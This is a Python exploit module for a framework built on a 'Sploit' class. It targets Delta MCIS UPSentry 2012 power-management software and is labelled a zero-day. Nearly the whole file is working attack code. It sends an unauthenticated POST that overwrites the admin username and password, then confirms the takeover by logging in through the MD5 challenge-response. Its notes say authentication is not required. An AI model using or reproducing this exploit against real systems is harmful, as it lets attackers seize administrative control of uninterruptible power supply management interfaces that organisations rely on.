#!/usr/bin/env python

import urllib2
import hashlib
import ssl
import re
from collections import OrderedDict
from Sploit import Sploit

ssl._create_default_https_context = ssl._create_unverified_context

INFO = {}
INFO['NAME'] = 'efa_delta_mcis_upsentry2012_privilege_escalation'
INFO['DESCRIPTION'] = 'Delta MCIS UPSentry 2012 Privilege Escalation'
INFO['VENDOR'] = 'http://www.deltapowersolutions.com/en/mcis/upsentry.php'
INFO['CVE Name'] = '0day'
INFO['DOWNLOAD_LINK'] = 'http://59.125.232.140/ups/en/index.aspx'
INFO['LINKS'] = []
INFO['CHANGELOG'] = '4 Dec 2017'
INFO['PATH'] = 'General/'
INFO['NOTES'] = """    Vulnerability allows remote attackers to change users' credentials.
Authentication is not required to exploit this vulnerability.
Tested against UPSentry 2012 v02.01.13 on Windows 7 SP1 x64.
"""

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.1.176'
OPTIONS['PORT'] = 80
OPTIONS['SSL'] = False
OPTIONS['NEW ADMIN USERNAME'] = 'admin'
OPTIONS['NEW ADMIN PASSWORD'] = ''


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = self.args.get('PORT', OPTIONS['PORT'])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])
        self.new_admin_username = self.args.get('NEW ADMIN USERNAME', OPTIONS['NEW ADMIN USERNAME'])
        self.new_admin_password = self.args.get('NEW ADMIN PASSWORD', OPTIONS['NEW ADMIN PASSWORD'])

    def make_url(self, path=''):
        proto = 'https' if self.ssl else 'http'
        url = '%s://%s:%s/%s' % (proto, self.host, self.port, path)
        return url

    def check_creds(self):
        self.log('[*] Checking new credentials')
        res = urllib2.urlopen(self.make_url()).read()
        challenge = re.search('<input.*name="Challenge"\s+value="(.*?)">', res).group(1)
        resp_val = self.new_admin_username + self.new_admin_password + challenge
        resp_val = hashlib.md5(resp_val).hexdigest()
        url = self.make_url('delta/login')
        data = 'Username=%s&Password=&Submitbtn=++++++OK++++++&Challenge=&Response=%s' % (self.new_admin_username, resp_val)
        res = urllib2.urlopen(url, data)
        if 'home.asp' in res.url:
            self.log('[+] Successfully logged in using new credentials')
            return True
        return False

    def run(self):
        #Get options from gui
        self.args()
        url = self.make_url()
        self.log('[*] Checking connection to %s' % url)
        urllib2.urlopen(url)
        self.log('[*] Trying to change admin\'s credentials')
        url = self.make_url('delta/sys_user')
        data = 'USR_ACCOUNT1=%s&USR_PASSWD1=%s&OK=Submit' % (self.new_admin_username, self.new_admin_password)
        res = urllib2.urlopen(url, data)
        if self.check_creds():
            self.log('[+] New admin credentials:\r\n' + self.new_admin_username + ': ' + self.new_admin_password)
            self.finish(True)
        self.log('[-] Can\'t change admin credentials')
        self.finish(False)


if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()